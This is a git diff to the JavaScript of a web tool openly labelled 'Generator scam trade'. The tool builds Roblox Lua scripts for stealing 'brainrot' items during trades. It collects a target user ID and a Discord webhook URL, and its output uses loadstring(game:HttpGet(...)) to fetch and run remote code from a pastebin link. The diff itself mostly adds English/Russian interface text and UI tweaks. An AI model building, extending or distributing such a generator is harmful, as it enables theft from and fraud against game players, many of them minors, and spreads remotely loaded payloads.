@@ -50,6 +50,71 @@ const allBrainrots = [
     "La Vacca Saturno Saturnita", "Jackorilla", "Secret Lucky Block"
 ];
 
+// Тексты для двух языков
+const langTexts = {
+    en: {
+        titleSub: "Generator scam trade",
+        labelNick: "👤 Roblox Nickname",
+        labelId: "🆔 Roblox User ID",
+        labelWebhook: "🔗 Discord Webhook URL",
+        labelBrainrots: "🎯 Target Brainrots",
+        selectAll: "✅ Select All",
+        deselectAll: "❌ Clear All",
+        searchPlaceholder: "🔍 Search...",
+        labelScript: "📦 Additional Script",
+        script22s: "22s Hub",
+        scriptCustom: "Custom",
+        generate: "🚀 GENERATE",
+        copy: "📋 COPY",
+        outputTitle: "📜 Generated Script:"
+    },
+    ru: {
+        titleSub: "Generator scam trade",
+        labelNick: "👤 Roblox Никнейм",
+        labelId: "🆔 Roblox User ID",
+        labelWebhook: "🔗 Discord Webhook URL",
+        labelBrainrots: "🎯 Таргет брейнроты",
+        selectAll: "✅ Выбрать всех",
+        deselectAll: "❌ Убрать всех",
+        searchPlaceholder: "🔍 Поиск...",
+        labelScript: "📦 Дополнительный скрипт",
+        script22s: "22s Hub",
+        scriptCustom: "Свой",
+        generate: "🚀 СГЕНЕРИРОВАТЬ",
+        copy: "📋 КОПИРОВАТЬ",
+        outputTitle: "📜 Сгенерированный скрипт:"
+    }
+};
+
+let currentLang = 'ru';
+
+// Функция обновления текста
+function updateLanguage() {
+    const texts = langTexts[currentLang];
+    document.getElementById('subtitle').textContent = texts.titleSub;
+    document.getElementById('labelNick').textContent = texts.labelNick;
+    document.getElementById('labelId').textContent = texts.labelId;
+    document.getElementById('labelWebhook').textContent = texts.labelWebhook;
+    document.getElementById('labelBrainrots').textContent = texts.labelBrainrots;
+    document.getElementById('selectAllBtn').textContent = texts.selectAll;
+    document.getElementById('deselectAllBtn').textContent = texts.deselectAll;
+    document.getElementById('searchBrainrots').placeholder = texts.searchPlaceholder;
+    document.getElementById('labelScript').textContent = texts.labelScript;
+    
+    const radioLabels = document.querySelectorAll('.radio-label');
+    if (radioLabels.length >= 2) {
+        radioLabels[0].innerHTML = `<input type="radio" name="scriptType" value="22s" checked> ${texts.script22s}`;
+        radioLabels[1].innerHTML = `<input type="radio" name="scriptType" value="custom"> ${texts.scriptCustom}`;
+    }
+    
+    document.getElementById('generateBtn').textContent = texts.generate;
+    const copyBtn = document.getElementById('copyBtn');
+    if (copyBtn.style.display !== 'none') {
+        copyBtn.textContent = texts.copy;
+    }
+    document.getElementById('outputTitle').textContent = texts.outputTitle;
+}
+
 // Заполнение списка чекбоксами
 function populateBrainrotsList() {
     let container = document.getElementById('brainrotsList');
@@ -118,12 +183,12 @@ document.getElementById('generateBtn').addEventListener('click', function() {
     });
     
     if (selectedBrainrots.length === 0) {
-        alert('Выберите хотя бы один брейнрот');
+        alert(currentLang === 'ru' ? 'Выберите хотя бы один брейнрот' : 'Select at least one brainrot');
         return;
     }
     
     if (!webhookUrl) {
-        alert('Введите Webhook URL');
+        alert(currentLang === 'ru' ? 'Введите Webhook URL' : 'Enter Webhook URL');
         return;
     }
     
@@ -131,7 +196,6 @@ document.getElementById('generateBtn').addEventListener('click', function() {
         ? 'loadstring(game:HttpGet("https://pastebin.com/raw/vyRfjXm0"))()'
         : customScript;
     
-    // Формируем список брейнротов для Lua
     let brainrotListStr = "{\n    " + selectedBrainrots.map(br => `"${br}"`).join(",\n    ") + "\n}";
     
     let script = `-- ========== КОНФИГ ==========
@@ -144,25 +208,24 @@ local CONFIG = {
 -- ========== КОНЕЦ КОНФИГА ==========
 
 -- ===== ЗАГРУЗКА ОСНОВНОГО СКРИПТА =====
--- ССЫЛКА НА ОСНОВНОЙ СКРИПТ (ЗАМЕНИТЬ НА РЕАЛЬНУЮ)
 loadstring(game:HttpGet("ССЫЛКА_НА_СКРИПТ"))()
 
-print("Скрипт загружен")
-print("Таргет ID: " .. CONFIG.TARGET_USER_ID)
-print("Таргет брейнротов: " .. #CONFIG.TARGET_BRAINROTS .. " шт.")`;
+print("Script loaded | Таргет ID: " .. CONFIG.TARGET_USER_ID .. " | Brainrots: " .. #CONFIG.TARGET_BRAINROTS)`;
 
     document.getElementById('scriptOutput').textContent = script;
     document.getElementById('output').style.display = 'block';
-    document.getElementById('copyBtn').style.display = 'inline-block';
+    const copyBtn = document.getElementById('copyBtn');
+    copyBtn.style.display = 'inline-block';
+    copyBtn.textContent = langTexts[currentLang].copy;
 });
 
 // Копирование
 document.getElementById('copyBtn').addEventListener('click', function() {
     let script = document.getElementById('scriptOutput').textContent;
     navigator.clipboard.writeText(script).then(() => {
-        alert('Скрипт скопирован!');
+        alert(currentLang === 'ru' ? 'Скопировано!' : 'Copied!');
     }).catch(() => {
-        alert('Не удалось скопировать');
+        alert(currentLang === 'ru' ? 'Не удалось скопировать' : 'Failed to copy');
     });
 });
 
@@ -171,5 +234,27 @@ document.getElementById('discordBtn').addEventListener('click', function() {
     window.open('https://discord.gg/9A6x27c9k6', '_blank');
 });
 
-// Запуск
+// Языковые кнопки
+document.getElementById('langEn').addEventListener('click', function() {
+    currentLang = 'en';
+    updateLanguage();
+});
+
+document.getElementById('langRu').addEventListener('click', function() {
+    currentLang = 'ru';
+    updateLanguage();
+});
+
+// Анимация для полей ввода
+document.querySelectorAll('input, textarea').forEach(el => {
+    el.addEventListener('focus', function() {
+        this.parentElement.querySelector('label')?.style.setProperty('color', '#5a9eff');
+    });
+    el.addEventListener('blur', function() {
+        this.parentElement.querySelector('label')?.style.setProperty('color', '#b8d4ff');
+    });
+});
+
+// Инициализация
 populateBrainrotsList();
+updateLanguage();
